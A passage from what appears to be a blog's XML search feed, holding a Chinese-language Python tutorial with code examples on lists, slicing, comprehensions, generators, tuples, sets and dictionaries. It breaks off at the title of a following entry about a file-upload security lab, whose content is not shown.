class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a, b = <span class="number">5</span>, <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span> * <span class="subst">&#123;b&#125;</span> = <span class="subst">&#123;a * b&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>除了字符串，Python还内置了多种类型的数据结构，如果要在程序中保存和操作数据，绝大多数时候可以利用现有的数据结构来实现，最常用的包括列表、元组、集合和字典。</p><h2 id="3-2-列表"><a href="#3-2-列表" class="headerlink" title="3.2 列表"></a>3.2 列表</h2><p>列表（<code>list</code>）是一种结构化的、非标量类型，它是值的有序序列，每个值都可以通过索引进行标识，定义列表可以将列表的元素放在<code>[]</code>中，多个元素用<code>,</code>进行分隔，可以使用<code>for</code>循环对列表元素进行遍历，也可以使用<code>[]</code>或<code>[:]</code>运算符取出列表中的一个或多个元素。</p><p>下面的代码演示了如何定义列表、如何遍历列表以及列表的下标运算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">100</span>]</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 3, 5, 7, 100]</span></span><br><span class="line"><span class="comment"># 乘号表示列表元素的重复</span></span><br><span class="line">list2 = [<span class="string">&#x27;hello&#x27;</span>] * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(list2) <span class="comment"># [&#x27;hello&#x27;, &#x27;hello&#x27;, &#x27;hello&#x27;]</span></span><br><span class="line"><span class="comment"># 计算列表长度(元素个数)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(list1)) <span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 下标(索引)运算</span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">0</span>]) <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">4</span>]) <span class="comment"># 100</span></span><br><span class="line"><span class="comment"># print(list1[5])  # IndexError: list index out of range</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">1</span>]) <span class="comment"># 100</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">3</span>]) <span class="comment"># 5</span></span><br><span class="line">list1[<span class="number">2</span>] = <span class="number">300</span></span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 3, 300, 7, 100]</span></span><br><span class="line"><span class="comment"># 通过循环用下标遍历列表元素</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list1)):</span><br><span class="line">    <span class="built_in">print</span>(list1[index])</span><br><span class="line"><span class="comment"># 通过for循环遍历列表元素</span></span><br><span class="line"><span class="keyword">for</span> elem <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="built_in">print</span>(elem)</span><br><span class="line"><span class="comment"># 通过enumerate函数处理列表之后再遍历可以同时获得元素索引和值</span></span><br><span class="line"><span class="keyword">for</span> index, elem <span class="keyword">in</span> <span class="built_in">enumerate</span>(list1):</span><br><span class="line">    <span class="built_in">print</span>(index, elem)</span><br></pre></td></tr></table></figure><p>下面的代码演示了如何向列表中添加元素以及如何从列表中移除元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">100</span>]</span><br><span class="line"><span class="comment"># 添加元素</span></span><br><span class="line">list1.append(<span class="number">200</span>)</span><br><span class="line">list1.insert(<span class="number">1</span>, <span class="number">400</span>)</span><br><span class="line"><span class="comment"># 合并两个列表</span></span><br><span class="line"><span class="comment"># list1.extend([1000, 2000])</span></span><br><span class="line">list1 += [<span class="number">1000</span>, <span class="number">2000</span>]</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 400, 3, 5, 7, 100, 200, 1000, 2000]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(list1)) <span class="comment"># 9</span></span><br><span class="line"><span class="comment"># 先通过成员运算判断元素是否在列表中，如果存在就删除该元素</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">3</span> <span class="keyword">in</span> list1:</span><br><span class="line">  list1.remove(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">1234</span> <span class="keyword">in</span> list1:</span><br><span class="line">    list1.remove(<span class="number">1234</span>)</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 400, 5, 7, 100, 200, 1000, 2000]</span></span><br><span class="line"><span class="comment"># 从指定的位置删除元素</span></span><br><span class="line">list1.pop(<span class="number">0</span>)</span><br><span class="line">list1.pop(<span class="built_in">len</span>(list1) - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [400, 5, 7, 100, 200, 1000]</span></span><br><span class="line"><span class="comment"># 清空列表元素</span></span><br><span class="line">list1.clear()</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># []</span></span><br></pre></td></tr></table></figure><p>和字符串一样，列表也可以做切片操作，通过切片操作我们可以实现对列表的复制或者将列表中的一部分取出来创建出新的列表，代码如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fruits = [<span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;strawberry&#x27;</span>, <span class="string">&#x27;waxberry&#x27;</span>]</span><br><span class="line">fruits += [<span class="string">&#x27;pitaya&#x27;</span>, <span class="string">&#x27;pear&#x27;</span>, <span class="string">&#x27;mango&#x27;</span>]</span><br><span class="line"><span class="comment"># 列表切片</span></span><br><span class="line">fruits2 = fruits[<span class="number">1</span>:<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(fruits2) <span class="comment"># apple strawberry waxberry</span></span><br><span class="line"><span class="comment"># 可以通过完整切片操作来复制列表</span></span><br><span class="line">fruits3 = fruits[:]</span><br><span class="line"><span class="built_in">print</span>(fruits3) <span class="comment"># [&#x27;grape&#x27;, &#x27;apple&#x27;, &#x27;strawberry&#x27;, &#x27;waxberry&#x27;, &#x27;pitaya&#x27;, &#x27;pear&#x27;, &#x27;mango&#x27;]</span></span><br><span class="line">fruits4 = fruits[-<span class="number">3</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(fruits4) <span class="comment"># [&#x27;pitaya&#x27;, &#x27;pear&#x27;]</span></span><br><span class="line"><span class="comment"># 可以通过反向切片操作来获得倒转后的列表的拷贝</span></span><br><span class="line">fruits5 = fruits[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(fruits5) <span class="comment"># [&#x27;mango&#x27;, &#x27;pear&#x27;, &#x27;pitaya&#x27;, &#x27;waxberry&#x27;, &#x27;strawberry&#x27;, &#x27;apple&#x27;, &#x27;grape&#x27;]</span></span><br></pre></td></tr></table></figure><p>下面的代码实现了对列表的排序操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;zoo&#x27;</span>, <span class="string">&#x27;internationalization&#x27;</span>, <span class="string">&#x27;blueberry&#x27;</span>]</span><br><span class="line">list2 = <span class="built_in">sorted</span>(list1)</span><br><span class="line"><span class="comment"># sorted函数返回列表排序后的拷贝不会修改传入的列表</span></span><br><span class="line"><span class="comment"># reverse参数为True是指降序排序，没写默认为升序</span></span><br><span class="line">list3 = <span class="built_in">sorted</span>(list1, reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 通过key关键字参数指定根据字符串长度进行排序而不是默认的字母表顺序</span></span><br><span class="line">list4 = <span class="built_in">sorted</span>(list1, key=<span class="built_in">len</span>)</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"><span class="built_in">print</span>(list3)</span><br><span class="line"><span class="built_in">print</span>(list4)</span><br><span class="line"><span class="comment"># 给列表对象发出排序消息直接在列表对象上进行排序</span></span><br><span class="line">list1.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br></pre></td></tr></table></figure><h2 id="3-3-生成式和生成器"><a href="#3-3-生成式和生成器" class="headerlink" title="3.3 生成式和生成器"></a>3.3 生成式和生成器</h2><p>我们还可以使用列表的生成式语法来创建列表，代码如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line">f = [x + y <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;ABCDE&#x27;</span> <span class="keyword">for</span> y <span class="keyword">in</span> <span class="string">&#x27;1234567&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"><span class="comment"># 用列表的生成表达式语法创建列表容器</span></span><br><span class="line"><span class="comment"># 用这种语法创建列表之后元素已经准备就绪所以需要耗费较多的内存空间</span></span><br><span class="line">f = [x ** <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>)]</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(f))  <span class="comment"># 查看对象占用内存的字节数</span></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"><span class="comment"># 请注意下面的代码创建的不是一个列表而是一个生成器对象</span></span><br><span class="line"><span class="comment"># 通过生成器可以获取到数据但它不占用额外的空间存储数据</span></span><br><span class="line"><span class="comment"># 每次需要数据的时候就通过内部的运算得到数据(需要花费额外的时间)</span></span><br><span class="line">f = (x ** <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>))</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(f))  <span class="comment"># 相比生成式生成器不占用存储数据的空间</span></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(val)</span><br></pre></td></tr></table></figure><h2 id="3-4-yeild"><a href="#3-4-yeild" class="headerlink" title="3.4 yeild"></a>3.4 <code>yeild</code></h2><p>除了上面提到的生成器语法，Python中还有另外一种定义生成器的方式，就是通过<code>yield</code>关键字将一个普通函数改造成生成器函数。下面的代码演示了如何实现一个生成<a href="https://zh.wikipedia.org/wiki/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97" title="斐波拉切数列">斐波拉切数列</a>的生成器。所谓斐波拉切数列可以通过下面<a href="https://zh.wikipedia.org/wiki/%E9%80%92%E5%BD%92" title="递归">递归</a>的方法来进行定义：</p><p><img src="/2024/07/21/Python%E5%AD%A6%E4%B9%A01%EF%BC%9A%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image_ObGpjylcce.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> fib(<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(val)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="3-5-元组"><a href="#3-5-元组" class="headerlink" title="3.5 元组"></a>3.5 元组</h2><p>Python中的元组与列表类似也是一种容器数据类型，可以用一个变量（对象）来存储多个数据，不同之处在于<strong>元组的元素不能修改</strong>，在前面的代码中我们已经不止一次使用过元组了。顾名思义，我们把多个元素组合到一起就形成了一个元组，所以它和列表一样可以保存多条数据。下面的代码演示了如何定义和使用元组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义元组</span></span><br><span class="line">t = (<span class="string">&#x27;骆昊&#x27;</span>, <span class="number">38</span>, <span class="literal">True</span>, <span class="string">&#x27;四川成都&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># 获取元组中的元素</span></span><br><span class="line"><span class="built_in">print</span>(t[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(t[<span class="number">3</span>])</span><br><span class="line"><span class="comment"># 遍历元组中的值</span></span><br><span class="line"><span class="keyword">for</span> member <span class="keyword">in</span> t:</span><br><span class="line">    <span class="built_in">print</span>(member)</span><br><span class="line"><span class="comment"># 重新给元组赋值</span></span><br><span class="line"><span class="comment"># t[0] = &#x27;王大锤&#x27;  # TypeError</span></span><br><span class="line"><span class="comment"># 变量t重新引用了新的元组原来的元组将被垃圾回收</span></span><br><span class="line">t = (<span class="string">&#x27;王大锤&#x27;</span>, <span class="number">20</span>, <span class="literal">True</span>, <span class="string">&#x27;云南昆明&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># 将元组转换成列表</span></span><br><span class="line">person = <span class="built_in">list</span>(t)</span><br><span class="line"><span class="built_in">print</span>(person)</span><br><span class="line"><span class="comment"># 列表是可以修改它的元素的</span></span><br><span class="line">person[<span class="number">0</span>] = <span class="string">&#x27;李小龙&#x27;</span></span><br><span class="line">person[<span class="number">1</span>] = <span class="number">25</span></span><br><span class="line"><span class="built_in">print</span>(person)</span><br><span class="line"><span class="comment"># 将列表转换成元组</span></span><br><span class="line">fruits_list = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]</span><br><span class="line">fruits_tuple = <span class="built_in">tuple</span>(fruits_list)</span><br><span class="line"><span class="built_in">print</span>(fruits_tuple)</span><br></pre></td></tr></table></figure><p>这里有一个非常值得探讨的问题，我们已经有了列表这种数据结构，为什么还需要元组这样的类型呢？</p><ol><li><p>元组中的元素是无法修改的，事实上我们在项目中尤其是<a href="https://zh.wikipedia.org/zh-hans/%E5%A4%9A%E7%BA%BF%E7%A8%8B" title="多线程">多线程</a>环境（后面会讲到）中可能更喜欢使用的是那些不变对象</p><p>一方面因为对象状态不能修改，所以可以避免由此引起的不必要的程序错误，简单的说就是一个不变的对象要比可变的对象更加容易维护；</p><p>另一方面因为没有任何一个线程能够修改不变对象的内部状态，一个不变对象自动就是线程安全的，这样就可以省掉处理同步化的开销。一个不变对象可以方便的被共享访问；</p><p>所以结论就是：如果不需要对元素进行添加、删除、修改的时候，可以考虑使用元组，当然如果一个方法要返回多个值，使用元组也是不错的选择。</p></li><li><p>元组在创建时间和占用的空间上面都优于列表。可以使用<code>sys</code>模块的<code>getsizeof</code>函数来检查存储同样的元素的元组和列表各自占用了多少内存空间，这个很容易做到。我们也可以在<code>ipython</code>中使用魔法指令<code>%timeit</code>来分析创建同样内容的元组和列表所花费的时间</p></li></ol><p><img src="/2024/07/21/Python%E5%AD%A6%E4%B9%A01%EF%BC%9A%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image_hGg6flfKpm.png"></p><h2 id="3-6-集合"><a href="#3-6-集合" class="headerlink" title="3.6 集合"></a>3.6 集合</h2><p>Python中的集合跟数学上的集合是一致的，不允许有重复元素，而且可以进行交集、并集、差集等运算。</p><p><img src="/2024/07/21/Python%E5%AD%A6%E4%B9%A01%EF%BC%9A%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image_FQWk46SUPi.png"></p><p>可以按照下面代码所示的方式来创建和使用集合。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建集合的字面量语法</span></span><br><span class="line">set1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Length =&#x27;</span>, <span class="built_in">len</span>(set1))</span><br><span class="line"><span class="comment"># 创建集合的构造器语法(面向对象部分会进行详细讲解)</span></span><br><span class="line">set2 = <span class="built_in">set</span>(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>))</span><br><span class="line">set3 = <span class="built_in">set</span>((<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(set2, set3)</span><br><span class="line"><span class="comment"># 创建集合的推导式语法(推导式也可以用于推导集合)</span></span><br><span class="line">set4 = &#123;num <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>) <span class="keyword">if</span> num % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">or</span> num % <span class="number">5</span> == <span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(set4)</span><br></pre></td></tr></table></figure><p>向集合添加元素和从集合删除元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set1.add(<span class="number">4</span>)</span><br><span class="line">set1.add(<span class="number">5</span>)</span><br><span class="line">set2.update([<span class="number">11</span>, <span class="number">12</span>])</span><br><span class="line">set2.discard(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">4</span> <span class="keyword">in</span> set2:</span><br><span class="line">    set2.remove(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(set1, set2)</span><br><span class="line"><span class="built_in">print</span>(set3.pop())</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br></pre></td></tr></table></figure><p>集合的成员、交集、并集、差集等运算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 集合的交集、并集、差集、对称差运算</span></span><br><span class="line"><span class="built_in">print</span>(set1 &amp; set2)</span><br><span class="line"><span class="comment"># print(set1.intersection(set2))</span></span><br><span class="line"><span class="built_in">print</span>(set1 | set2)</span><br><span class="line"><span class="comment"># print(set1.union(set2))</span></span><br><span class="line"><span class="built_in">print</span>(set1 - set2)</span><br><span class="line"><span class="comment"># print(set1.difference(set2))</span></span><br><span class="line"><span class="built_in">print</span>(set1 ^ set2)</span><br><span class="line"><span class="comment"># print(set1.symmetric_difference(set2))</span></span><br><span class="line"><span class="comment"># 判断子集和超集</span></span><br><span class="line"><span class="built_in">print</span>(set2 &lt;= set1)</span><br><span class="line"><span class="comment"># print(set2.issubset(set1))</span></span><br><span class="line"><span class="built_in">print</span>(set3 &lt;= set1)</span><br><span class="line"><span class="comment"># print(set3.issubset(set1))</span></span><br><span class="line"><span class="built_in">print</span>(set1 &gt;= set2)</span><br><span class="line"><span class="comment"># print(set1.issuperset(set2))</span></span><br><span class="line"><span class="built_in">print</span>(set1 &gt;= set3)</span><br><span class="line"><span class="comment"># print(set1.issuperset(set3))</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>说明：</strong> Python中允许通过一些特殊的方法来为某种类型或数据结构自定义运算符，上面的代码中我们对集合进行运算的时候可以调用集合对象的方法，也可以直接使用对应的运算符，例如<code>&amp;</code>运算符跟intersection方法的作用就是一样的，但是使用运算符让代码更加直观。</p></blockquote><h2 id="3-7-字典"><a href="#3-7-字典" class="headerlink" title="3.7 字典"></a>3.7 字典</h2><p>字典是另一种可变容器模型，Python中的字典跟我们生活中使用的字典是一样一样的，它可以存储任意类型对象，与列表、集合不同的是，字典的每个元素都是由一个键和一个值组成的“键值对”，键和值通过冒号分开。下面的代码演示了如何定义和使用字典。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建字典的字面量语法</span></span><br><span class="line">scores = &#123;<span class="string">&#x27;弘树&#x27;</span>: <span class="number">95</span>, <span class="string">&#x27;白元芳&#x27;</span>: <span class="number">78</span>, <span class="string">&#x27;狄仁杰&#x27;</span>: <span class="number">82</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(scores)</span><br><span class="line"><span class="comment"># 创建字典的构造器语法</span></span><br><span class="line">items1 = <span class="built_in">dict</span>(one=<span class="number">1</span>, two=<span class="number">2</span>, three=<span class="number">3</span>, four=<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 通过zip函数将两个序列压成字典</span></span><br><span class="line">items2 = <span class="built_in">dict</span>(<span class="built_in">zip</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>], <span class="string">&#x27;123&#x27;</span>))</span><br><span class="line"><span class="comment"># 创建字典的推导式语法</span></span><br><span class="line">items3 = &#123;num: num ** <span class="number">2</span> <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>)&#125;</span><br><span class="line"><span class="built_in">print</span>(items1, items2, items3)</span><br><span class="line"><span class="comment"># 通过键可以获取字典中对应的值</span></span><br><span class="line"><span class="built_in">print</span>(scores[<span class="string">&#x27;骆昊&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(scores[<span class="string">&#x27;狄仁杰&#x27;</span>])</span><br><span class="line"><span class="comment"># 对字典中所有键值对进行遍历</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> scores:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;scores[key]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 更新字典中的元素</span></span><br><span class="line">scores[<span class="string">&#x27;白元芳&#x27;</span>] = <span class="number">65</span></span><br><span class="line">scores[<span class="string">&#x27;诸葛王朗&#x27;</span>] = <span class="number">71</span></span><br><span class="line">scores.update(冷面=<span class="number">67</span>, 方启鹤=<span class="number">85</span>)</span><br><span class="line"><span class="built_in">print</span>(scores)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;武则天&#x27;</span> <span class="keyword">in</span> scores:</span><br><span class="line">    <span class="built_in">print</span>(scores[<span class="string">&#x27;武则天&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(scores.get(<span class="string">&#x27;武则天&#x27;</span>))</span><br><span class="line"><span class="comment"># get方法也是通过键获取对应的值但是可以设置默认值</span></span><br><span class="line"><span class="built_in">print</span>(scores.get(<span class="string">&#x27;武则天&#x27;</span>, <span class="number">60</span>))</span><br><span class="line"><span class="comment"># 删除字典中的元素</span></span><br><span class="line"><span class="built_in">print</span>(scores.popitem())</span><br><span class="line"><span class="built_in">print</span>(scores.popitem())</span><br><span class="line"><span class="built_in">print</span>(scores.pop(<span class="string">&#x27;骆昊&#x27;</span>, <span class="number">100</span>))</span><br><span class="line"><span class="comment"># 清空字典</span></span><br><span class="line">scores.clear()</span><br><span class="line"><span class="built_in">print</span>(scores)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全实验4：文件上传</title>
      <link href="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
